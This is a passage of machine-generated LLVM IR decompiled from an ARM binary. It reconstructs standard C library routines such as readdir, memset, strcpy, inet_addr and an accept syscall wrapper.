dec_label_pc_13508:                               ; preds = %dec_label_pc_134bc, %dec_label_pc_134f4
  %v2_13508.in = phi i16 [ %v3_134c4, %dec_label_pc_134bc ], [ %v3_134fc, %dec_label_pc_134f4 ]
  %v1_13508 = phi i32 [ %v0_134c0, %dec_label_pc_134bc ], [ %v0_134f8, %dec_label_pc_134f4 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_134bc ], [ %v1_13504, %dec_label_pc_134f4 ]
  %v2_13508 = sext i16 %v2_13508.in to i32
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v3_13508 = add i32 %v1_13508, %v2_13508
  %v4_13508 = inttoptr i32 %v3_13508 to i32*
  store i32 %storemerge, i32* %v4_13508, align 4
  %v0_13528.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13528

dec_label_pc_13510:                               ; preds = %dec_label_pc_134e8
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_13514 = load i32, i32* @r4, align 4
  %v2_13518 = call i32 @fd_to_DIR(i32 %v0_13514, i32 %tmp)
  store i32 %v2_13518, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13528

dec_label_pc_13524:                               ; preds = %entry, %dec_label_pc_134d4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13528

dec_label_pc_13528:                               ; preds = %dec_label_pc_13510, %dec_label_pc_13508, %dec_label_pc_13524
  %v0_13528 = phi i32 [ %v2_13518, %dec_label_pc_13510 ], [ %v0_13528.pre, %dec_label_pc_13508 ], [ 0, %dec_label_pc_13524 ]
  ret i32 %v0_13528

; uselistorder directives
  uselistorder i32 %v1_134e8, { 1, 0 }
  uselistorder i32 %v2_134dc, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 6, 4, 5, 7, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 21, { 3, 0, 4, 5, 2, 1, 6 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_13528, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13524, { 1, 0 }
  uselistorder label %dec_label_pc_13508, { 1, 0 }
}

define i32 @__GI_readdir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_13540 = load i32, i32* @r4, align 4
  %v6_13540 = load i32, i32* @r5, align 4
  %v9_13540 = load i32, i32* @r6, align 4
  %v12_13540 = load i32, i32* @r7, align 4
  %v15_13540 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* @r6, align 4
  %v1_13554 = add i32 %tmp, 24
  store i32 %v1_13554, i32* @r4, align 4
  %v4_13558 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 68) to i32*), align 4
  store i32 %v4_13558, i32* %r1.global-to-local, align 4
  store i32 %v1_13554, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_1356c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1356c)
  %v0_13580 = load i32, i32* @r6, align 4
  %v2_13580 = add i32 %v0_13580, 16
  %v3_13580 = inttoptr i32 %v2_13580 to i32*
  %v4_13580 = load i32, i32* %v3_13580, align 4
  store i32 %v4_13580, i32* @ip, align 4
  store i32 79244, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13580)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_13590

dec_label_pc_13590:                               ; preds = %dec_label_pc_135c0, %entry
  %v0_13590 = load i32, i32* @r5, align 4
  %v1_13590 = add i32 %v0_13590, 4
  %v2_13590 = inttoptr i32 %v1_13590 to i32*
  %v3_13590 = load i32, i32* %v2_13590, align 4
  store i32 %v3_13590, i32* %r2.global-to-local, align 4
  %v4_13590 = add i32 %v0_13590, 8
  %v5_13590 = inttoptr i32 %v4_13590 to i32*
  %v6_13590 = load i32, i32* %v5_13590, align 4
  %tmp10 = icmp ugt i32 %v6_13590, %v3_13590
  br i1 %tmp10, label %dec_label_pc_135c0, label %dec_label_pc_1359c

dec_label_pc_1359c:                               ; preds = %dec_label_pc_13590
  %v1_1359c = inttoptr i32 %v0_13590 to i32*
  %v2_1359c = load i32, i32* %v1_1359c, align 4
  %v1_135a0 = add i32 %v0_13590, 12
  %v2_135a0 = inttoptr i32 %v1_135a0 to i32*
  %v3_135a0 = load i32, i32* %v2_135a0, align 4
  store i32 %v3_135a0, i32* %r1.global-to-local, align 4
  %v1_135a4 = add i32 %v0_13590, 20
  %v2_135a4 = inttoptr i32 %v1_135a4 to i32*
  %v3_135a4 = load i32, i32* %v2_135a4, align 4
  store i32 %v3_135a4, i32* %r2.global-to-local, align 4
  %v4_135a8 = call i32 @__getdents(i32 %v2_1359c, i32 %v3_135a0, i32 %v3_135a4, i32 %v6_13590)
  %tmp9 = icmp slt i32 %v4_135a8, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_135b8

.thread:                                          ; preds = %dec_label_pc_1359c
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_135ec

dec_label_pc_135b8:                               ; preds = %dec_label_pc_1359c
  %v1_135b8 = load i32, i32* @r5, align 4
  %v2_135b8 = add i32 %v1_135b8, 8
  %v3_135b8 = inttoptr i32 %v2_135b8 to i32*
  store i32 %v4_135a8, i32* %v3_135b8, align 4
  %v0_135bc = load i32, i32* @r7, align 4
  %v1_135bc = load i32, i32* @r5, align 4
  %v2_135bc = add i32 %v1_135bc, 4
  %v3_135bc = inttoptr i32 %v2_135bc to i32*
  store i32 %v0_135bc, i32* %v3_135bc, align 4
  %v0_135c0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_135c0

dec_label_pc_135c0:                               ; preds = %dec_label_pc_13590, %dec_label_pc_135b8
  %v1_135d0 = phi i32 [ %v0_13590, %dec_label_pc_13590 ], [ %v0_135c0.pre, %dec_label_pc_135b8 ]
  %v1_135c0 = add i32 %v1_135d0, 4
  %v2_135c0 = inttoptr i32 %v1_135c0 to i32*
  %v3_135c0 = load i32, i32* %v2_135c0, align 4
  store i32 %v3_135c0, i32* %r2.global-to-local, align 4
  %v1_135c4 = add i32 %v1_135d0, 12
  %v2_135c4 = inttoptr i32 %v1_135c4 to i32*
  %v3_135c4 = load i32, i32* %v2_135c4, align 4
  store i32 %v3_135c4, i32* %r1.global-to-local, align 4
  %v2_135c8 = add i32 %v3_135c4, %v3_135c0
  store i32 %v2_135c8, i32* @r4, align 4
  %v1_135cc = add i32 %v2_135c8, 4
  %v2_135cc = inttoptr i32 %v1_135cc to i32*
  %v3_135cc = load i32, i32* %v2_135cc, align 4
  %v2_135d0 = add i32 %v1_135d0, 16
  %v3_135d0 = inttoptr i32 %v2_135d0 to i32*
  store i32 %v3_135cc, i32* %v3_135d0, align 4
  %v0_135d4 = load i32, i32* @r4, align 4
  %v1_135d4 = add i32 %v0_135d4, 8
  %v2_135d4 = inttoptr i32 %v1_135d4 to i16*
  %v3_135d4 = load i16, i16* %v2_135d4, align 2
  %v4_135d4 = zext i16 %v3_135d4 to i32
  %v0_135d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_135d8 = load i32, i32* %r1.global-to-local, align 4
  %v2_135d8 = add i32 %v1_135d8, %v0_135d8
  %v3_135d8 = inttoptr i32 %v2_135d8 to i32*
  %v4_135d8 = load i32, i32* %v3_135d8, align 4
  store i32 %v4_135d8, i32* %r1.global-to-local, align 4
  %v2_135dc = add i32 %v0_135d8, %v4_135d4
  %v2_135e0 = icmp eq i32 %v4_135d8, 0
  %v1_135e4 = load i32, i32* @r5, align 4
  %v2_135e4 = add i32 %v1_135e4, 4
  %v3_135e4 = inttoptr i32 %v2_135e4 to i32*
  store i32 %v2_135dc, i32* %v3_135e4, align 4
  br i1 %v2_135e0, label %dec_label_pc_13590, label %dec_label_pc_135ec

dec_label_pc_135ec:                               ; preds = %dec_label_pc_135c0, %.thread
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_135f8 = load i32, i32* @r6, align 4
  %v2_135f8 = add i32 %v0_135f8, 44
  %v3_135f8 = inttoptr i32 %v2_135f8 to i32*
  %v4_135f8 = load i32, i32* %v3_135f8, align 4
  call void @__pseudo_branch(i32 %v4_135f8)
  %v0_13604 = load i32, i32* @r4, align 4
  store i32 %v3_13540, i32* @r4, align 4
  store i32 %v6_13540, i32* @r5, align 4
  store i32 %v9_13540, i32* @r6, align 4
  store i32 %v12_13540, i32* @r7, align 4
  store i32 %v15_13540, i32* @lr, align 4
  ret i32 %v0_13604

; uselistorder directives
  uselistorder i32 %v1_135d0, { 0, 2, 1 }
  uselistorder i32 %v6_13590, { 1, 0 }
  uselistorder i32 %v0_13590, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_135c0, { 1, 0 }
}

define i32 @function_13618(i32 %arg1) local_unnamed_addr {
dec_label_pc_13618:
  %v0_13618 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13618, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_13618
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13618, %bb
  %v4_13624 = phi i32 [ %arg1, %dec_label_pc_13618 ], [ 0, %bb ]
  ret i32 %v4_13624

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  %v0_13628 = load i32, i32* @lr, align 4
  %v0_13630 = call i32 @__aeabi_read_tp()
  %v3_13634 = load i16, i16* @global_var_2447c.761, align 2
  %v4_13634 = sext i16 %v3_13634 to i32
  %v2_13638 = add i32 %v4_13634, %v0_13630
  store i32 %v0_13628, i32* @lr, align 4
  ret i32 %v2_13638
}

define i32 @clock(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_1364c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1364c, i32* @r0, align 4
  %v1_13654 = call i32 @times(i32 %v2_1364c)
  %v2_13658 = load i32, i32* %stack_var_-24, align 4
  %v2_1365c = add i32 %v2_13658, %tmp
  %v2_13664 = mul i32 %v2_1365c, 10000
  %v1_13668 = and i32 %v2_13664, 2147483632
  ret i32 %v1_13668

; uselistorder directives
  uselistorder i32 %v2_1364c, { 1, 0 }
}

define i32 @"$d.10"(i32 %arg1) local_unnamed_addr {
dec_label_pc_13678:
  %v0_13678 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13678, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_13678
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_13678, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_13680 = call i32 @_memcpy()
  ret i32 %v0_13680
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_13690 = call i32 @_memcpy()
  ret i32 %v0_13690

; uselistorder directives
  uselistorder i32 ()* @_memcpy, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v8_136a4 = icmp eq i32 %arg3, 8
  store i1 %v8_136a4, i1* %cpsr_z.global-to-local, align 1
  %v5_136a8 = icmp slt i32 %arg3, 8
  br i1 %v5_136a8, label %dec_label_pc_13708, label %dec_label_pc_136ac

dec_label_pc_136ac:                               ; preds = %entry
  %v4_136ac = mul i32 %arg2, 256
  %v5_136ac = or i32 %v4_136ac, %arg2
  %v4_136b0 = mul i32 %v5_136ac, 65536
  %v5_136b0 = or i32 %v4_136b0, %v5_136ac
  store i32 %v5_136b0, i32* @r1, align 4
  %v1_136b457 = urem i32 %tmp, 4
  %v2_136b458 = icmp eq i32 %v1_136b457, 0
  store i1 %v2_136b458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_136b458, label %dec_label_pc_136c4, label %bb

bb:                                               ; preds = %dec_label_pc_136ac, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_136ac ]
  %v3_136b859 = phi i32 [ %v6_136b8, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_136ac ]
  %v4_136b8 = inttoptr i32 %v3_136b859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_136b8, align 1
  %v5_136b8 = load i32, i32* @r3, align 4
  %v6_136b8 = add i32 %v5_136b8, 1
  store i32 %v6_136b8, i32* @r3, align 4
  %v0_136bc.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_136c8.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_136bc.pr, label %dec_label_pc_136c4, label %.thread

.thread:                                          ; preds = %bb
  %v2_136bc = add i32 %v0_136c8.pr.pre, -1
  store i32 %v2_136bc, i32* %r2.global-to-local, align 4
  %v1_136b4 = urem i32 %v6_136b8, 4
  %v2_136b4 = icmp eq i32 %v1_136b4, 0
  store i1 %v2_136b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_136b4, label %dec_label_pc_136c4, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_136b8.pre = load i32, i32* @r1, align 4
  %extract.t82 = trunc i32 %v1_136b8.pre to i8
  br label %bb

dec_label_pc_136c4:                               ; preds = %.thread, %bb, %dec_label_pc_136ac
  %v0_136d028 = phi i32 [ %tmp, %dec_label_pc_136ac ], [ %v6_136b8, %bb ], [ %v6_136b8, %.thread ]
  %v0_136c8.pr = phi i32 [ %arg3, %dec_label_pc_136ac ], [ %v0_136c8.pr.pre, %bb ], [ %v2_136bc, %.thread ]
  %v0_136c4 = load i32, i32* @r1, align 4
  store i32 %v0_136c4, i32* %ip.global-to-local, align 4
  %v8_136c810 = icmp eq i32 %v0_136c8.pr, 8
  store i1 %v8_136c810, i1* %cpsr_z.global-to-local, align 1
  %v5_136cc11 = icmp slt i32 %v0_136c8.pr, 8
  br i1 %v5_136cc11, label %dec_label_pc_13708, label %dec_label_pc_136d0.preheader

dec_label_pc_136d0.preheader:                     ; preds = %dec_label_pc_136c4
  %v1_136d046 = inttoptr i32 %v0_136d028 to i32*
  store i32 %v0_136c4, i32* %v1_136d046, align 4
  %v3_136d047 = add i32 %v0_136d028, 4
  %v4_136d048 = inttoptr i32 %v3_136d047 to i32*
  %v5_136d049 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_136d049, i32* %v4_136d048, align 4
  %v6_136d050 = add i32 %v0_136d028, 8
  store i32 %v6_136d050, i32* @r3, align 4
  %v0_136d451 = load i32, i32* %r2.global-to-local, align 4
  %v1_136d452 = add i32 %v0_136d451, -8
  store i32 %v1_136d452, i32* %r2.global-to-local, align 4
  %v5_136dc53 = icmp slt i32 %v1_136d452, 8
  br i1 %v5_136dc53, label %dec_label_pc_136d0.dec_label_pc_13708.loopexit_crit_edge, label %dec_label_pc_136e0

dec_label_pc_136e0:                               ; preds = %dec_label_pc_136d0.preheader, %dec_label_pc_136c8.dec_label_pc_136d0_crit_edge
  %v6_136d055 = phi i32 [ %v6_136d0, %dec_label_pc_136c8.dec_label_pc_136d0_crit_edge ], [ %v6_136d050, %dec_label_pc_136d0.preheader ]
  %v0_136d054 = phi i32 [ %v12_136fc, %dec_label_pc_136c8.dec_label_pc_136d0_crit_edge ], [ %v0_136d028, %dec_label_pc_136d0.preheader ]
  %v1_136e0 = inttoptr i32 %v6_136d055 to i32*
  %v2_136e0 = load i32, i32* @r1, align 4
  store i32 %v2_136e0, i32* %v1_136e0, align 4
  %v3_136e0 = add i32 %v0_136d054, 12
  %v4_136e0 = inttoptr i32 %v3_136e0 to i32*
  %v5_136e0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_136e0, i32* %v4_136e0, align 4
  %v6_136e0 = add i32 %v0_136d054, 16
  store i32 %v6_136e0, i32* @r3, align 4
  %v0_136e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_136e4 = add i32 %v0_136e4, -8
  store i32 %v1_136e4, i32* %r2.global-to-local, align 4
  %v5_136ec = icmp slt i32 %v1_136e4, 8
  br i1 %v5_136ec, label %dec_label_pc_136e0.dec_label_pc_13708.loopexit_crit_edge, label %dec_label_pc_136f0

dec_label_pc_136f0:                               ; preds = %dec_label_pc_136e0
  %v1_136f0 = inttoptr i32 %v6_136e0 to i32*
  %v2_136f0 = load i32, i32* @r1, align 4
  store i32 %v2_136f0, i32* %v1_136f0, align 4
  %v3_136f0 = add i32 %v0_136d054, 20
  %v4_136f0 = inttoptr i32 %v3_136f0 to i32*
  %v5_136f0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_136f0, i32* %v4_136f0, align 4
  %v6_136f0 = add i32 %v0_136d054, 24
  store i32 %v6_136f0, i32* @r3, align 4
  %v0_136f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_136f4 = add i32 %v0_136f4, -8
  store i32 %v1_136f4, i32* %r2.global-to-local, align 4
  %v5_136fc = icmp slt i32 %v1_136f4, 8
  br i1 %v5_136fc, label %dec_label_pc_136f0.dec_label_pc_13708.loopexit_crit_edge, label %dec_label_pc_136c8

dec_label_pc_136c8:                               ; preds = %dec_label_pc_136f0
  %v7_136fc = inttoptr i32 %v6_136f0 to i32*
  %v8_136fc = load i32, i32* @r1, align 4
  store i32 %v8_136fc, i32* %v7_136fc, align 4
  %v9_136fc = add i32 %v0_136d054, 28
  %v10_136fc = inttoptr i32 %v9_136fc to i32*
  %v11_136fc = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_136fc, i32* %v10_136fc, align 4
  %v12_136fc = add i32 %v0_136d054, 32
  store i32 %v12_136fc, i32* @r3, align 4
  %v6_13700 = load i32, i32* %r2.global-to-local, align 4
  %v7_13700 = add i32 %v6_13700, -8
  store i32 %v7_13700, i32* %r2.global-to-local, align 4
  %v5_136cc = icmp slt i32 %v7_13700, 8
  br i1 %v5_136cc, label %dec_label_pc_136c8.dec_label_pc_13708.loopexit_crit_edge, label %dec_label_pc_136c8.dec_label_pc_136d0_crit_edge

dec_label_pc_136c8.dec_label_pc_136d0_crit_edge:  ; preds = %dec_label_pc_136c8
  %v2_136d0.pre = load i32, i32* @r1, align 4
  %v1_136d0 = inttoptr i32 %v12_136fc to i32*
  store i32 %v2_136d0.pre, i32* %v1_136d0, align 4
  %v3_136d0 = add i32 %v0_136d054, 36
  %v4_136d0 = inttoptr i32 %v3_136d0 to i32*
  %v5_136d0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_136d0, i32* %v4_136d0, align 4
  %v6_136d0 = add i32 %v0_136d054, 40
  store i32 %v6_136d0, i32* @r3, align 4
  %v0_136d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_136d4 = add i32 %v0_136d4, -8
  store i32 %v1_136d4, i32* %r2.global-to-local, align 4
  %v5_136dc = icmp slt i32 %v1_136d4, 8
  br i1 %v5_136dc, label %dec_label_pc_136d0.dec_label_pc_13708.loopexit_crit_edge, label %dec_label_pc_136e0

dec_label_pc_136c8.dec_label_pc_13708.loopexit_crit_edge: ; preds = %dec_label_pc_136c8
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13708

dec_label_pc_136d0.dec_label_pc_13708.loopexit_crit_edge: ; preds = %dec_label_pc_136c8.dec_label_pc_136d0_crit_edge, %dec_label_pc_136d0.preheader
  %v1_136d4.lcssa = phi i32 [ %v1_136d452, %dec_label_pc_136d0.preheader ], [ %v1_136d4, %dec_label_pc_136c8.dec_label_pc_136d0_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13708

dec_label_pc_136e0.dec_label_pc_13708.loopexit_crit_edge: ; preds = %dec_label_pc_136e0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13708

dec_label_pc_136f0.dec_label_pc_13708.loopexit_crit_edge: ; preds = %dec_label_pc_136f0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13708

dec_label_pc_13708:                               ; preds = %dec_label_pc_136c4, %dec_label_pc_136c8.dec_label_pc_13708.loopexit_crit_edge, %dec_label_pc_136d0.dec_label_pc_13708.loopexit_crit_edge, %dec_label_pc_136e0.dec_label_pc_13708.loopexit_crit_edge, %dec_label_pc_136f0.dec_label_pc_13708.loopexit_crit_edge, %entry
  %v0_13710 = phi i32 [ %arg3, %entry ], [ %v1_136f4, %dec_label_pc_136f0.dec_label_pc_13708.loopexit_crit_edge ], [ %v1_136e4, %dec_label_pc_136e0.dec_label_pc_13708.loopexit_crit_edge ], [ %v1_136d4.lcssa, %dec_label_pc_136d0.dec_label_pc_13708.loopexit_crit_edge ], [ %v7_13700, %dec_label_pc_136c8.dec_label_pc_13708.loopexit_crit_edge ], [ %v0_136c8.pr, %dec_label_pc_136c4 ]
  %v2_13708 = icmp eq i32 %v0_13710, 0
  store i1 %v2_13708, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13708, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_13708
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_13708
  %v1_13710 = sub i32 7, %v0_13710
  store i32 %v1_13710, i32* %r2.global-to-local, align 4
  %v3_13714 = mul i32 %v1_13710, 4
  %v4_13714 = add i32 %v3_13714, ptrtoint (i32* @global_var_1371c.806 to i32)
  call void @__pseudo_branch(i32 %v4_13714)
  %v0_1371c = load i32, i32* @r1, align 4
  %v1_1371c = trunc i32 %v0_1371c to i8
  %v2_1371c = load i32, i32* @r3, align 4
  %v3_1371c = inttoptr i32 %v2_1371c to i8*
  store i8 %v1_1371c, i8* %v3_1371c, align 1
  %v4_1371c = load i32, i32* @r3, align 4
  %v5_1371c = add i32 %v4_1371c, 1
  store i32 %v5_1371c, i32* %r3.global-to-local, align 4
  %v0_13720 = load i32, i32* @r1, align 4
  %v1_13720 = trunc i32 %v0_13720 to i8
  %v3_13720 = inttoptr i32 %v5_1371c to i8*
  store i8 %v1_13720, i8* %v3_13720, align 1
  %v4_13720 = load i32, i32* %r3.global-to-local, align 4
  %v5_13720 = add i32 %v4_13720, 1
  store i32 %v5_13720, i32* %r3.global-to-local, align 4
  %v0_13724 = load i32, i32* @r1, align 4
  %v1_13724 = trunc i32 %v0_13724 to i8
  %v3_13724 = inttoptr i32 %v5_13720 to i8*
  store i8 %v1_13724, i8* %v3_13724, align 1
  %v4_13724 = load i32, i32* %r3.global-to-local, align 4
  %v5_13724 = add i32 %v4_13724, 1
  store i32 %v5_13724, i32* %r3.global-to-local, align 4
  %v0_13728 = load i32, i32* @r1, align 4
  %v1_13728 = trunc i32 %v0_13728 to i8
  %v3_13728 = inttoptr i32 %v5_13724 to i8*
  store i8 %v1_13728, i8* %v3_13728, align 1
  %v4_13728 = load i32, i32* %r3.global-to-local, align 4
  %v5_13728 = add i32 %v4_13728, 1
  store i32 %v5_13728, i32* %r3.global-to-local, align 4
  %v0_1372c = load i32, i32* @r1, align 4
  %v1_1372c = trunc i32 %v0_1372c to i8
  %v3_1372c = inttoptr i32 %v5_13728 to i8*
  store i8 %v1_1372c, i8* %v3_1372c, align 1
  %v4_1372c = load i32, i32* %r3.global-to-local, align 4
  %v5_1372c = add i32 %v4_1372c, 1
  store i32 %v5_1372c, i32* %r3.global-to-local, align 4
  %v0_13730 = load i32, i32* @r1, align 4
  %v1_13730 = trunc i32 %v0_13730 to i8
  %v3_13730 = inttoptr i32 %v5_1372c to i8*
  store i8 %v1_13730, i8* %v3_13730, align 1
  %v4_13730 = load i32, i32* %r3.global-to-local, align 4
  %v5_13730 = add i32 %v4_13730, 1
  store i32 %v5_13730, i32* %r3.global-to-local, align 4
  %v0_13734 = load i32, i32* @r1, align 4
  %v1_13734 = trunc i32 %v0_13734 to i8
  %v3_13734 = inttoptr i32 %v5_13730 to i8*
  store i8 %v1_13734, i8* %v3_13734, align 1
  %v4_13734 = load i32, i32* %r3.global-to-local, align 4
  %v5_13734 = add i32 %v4_13734, 1
  store i32 %v5_13734, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_136d0, { 1, 0 }
  uselistorder i32 %v12_136fc, { 1, 2, 0 }
  uselistorder i32 %v0_136d054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_136c8.pr, { 0, 2, 1 }
  uselistorder i32 %v6_136b8, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_136ac, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 10, 3, 4, 5, 6, 7, 8, 9, 1, 11, 13, 12, 0 }
  uselistorder i32* %ip.global-to-local, { 4, 1, 2, 3, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 2, 1, 0, 3, 5, 9, 8, 4, 7 }
  uselistorder i32 %arg3, { 1, 0, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_13708, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_136e0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_137501 = load i32, i32* @r1, align 4
  %v1_137502 = inttoptr i32 %v0_137501 to i8*
  %v2_137503 = load i8, i8* %v1_137502, align 1
  %v2_137545 = icmp eq i8 %v2_137503, 0
  store i1 %v2_137545, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_137503, i8* %arg1, align 1
  br i1 %v2_137545, label %dec_label_pc_13760, label %dec_label_pc_13748

dec_label_pc_13748:                               ; preds = %entry, %dec_label_pc_13748
  %v0_13748 = load i32, i32* @r1, align 4
  %v1_13748 = add i32 %v0_13748, 1
  store i32 %v1_13748, i32* @r1, align 4
  %v0_1374c = load i32, i32* %r2.global-to-local, align 4
  %v1_1374c = add i32 %v0_1374c, 1
  store i32 %v1_1374c, i32* %r2.global-to-local, align 4
  %v1_13750 = inttoptr i32 %v1_13748 to i8*
  %v2_13750 = load i8, i8* %v1_13750, align 1
  %v2_13754 = icmp eq i8 %v2_13750, 0
  store i1 %v2_13754, i1* %cpsr_z.global-to-local, align 1
  %v3_13758 = inttoptr i32 %v1_1374c to i8*
  store i8 %v2_13750, i8* %v3_13758, align 1
  %v0_1375c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1375c, label %dec_label_pc_13760, label %dec_label_pc_13748

dec_label_pc_13760:                               ; preds = %dec_label_pc_13748, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_13748, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_1376c = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_1376c, i32* @r1, align 4
  %v0_13770 = call i32 @inet_aton()
  %v2_13774 = icmp eq i32 %v0_13770, 0
  %v4_13778 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_13774, i32 -1, i32 %v4_13778
  ret i32 %storemerge
}

define i32 @__sys_accept() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1378c = load i32, i32* @r7, align 4
  store i32 %v3_1378c, i32* %stack_var_-8, align 4
  %v0_13798 = load i32, i32* @r0, align 4
  store i32 %v0_13798, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13798, -4095
  br i1 %tmp, label %dec_label_pc_137c0, label %dec_label_pc_137a8

dec_label_pc_137a8:                               ; preds = %entry
  %v0_137ac = call i32 @__aeabi_read_tp()
  %v3_137b0 = load i16, i16* @global_var_2447c.761, align 2
  %v4_137b0 = sext i16 %v3_137b0 to i32
  %v0_137b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_137b4 = sub i32 0, %v0_137b4
  store i32 %v1_137b4, i32* %r2.global-to-local, align 4
  %v3_137b8 = add i32 %v4_137b0, %v0_137ac
  %v4_137b8 = inttoptr i32 %v3_137b8 to i32*
  store i32 %v1_137b4, i32* %v4_137b8, align 4
  %v2_137c0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_137c0

dec_label_pc_137c0:                               ; preds = %entry, %dec_label_pc_137a8
  %v1_137c4 = phi i32 [ %v0_13798, %entry ], [ -1, %dec_label_pc_137a8 ]
  %v2_137c0 = phi i32 [ %v3_1378c, %entry ], [ %v2_137c0.pre, %dec_label_pc_137a8 ]
  store i32 %v2_137c0, i32* @r7, align 4
  ret i32 %v1_137c4

; uselistorder directives
  uselistorder i32 %v0_13798, { 1, 0, 2 }
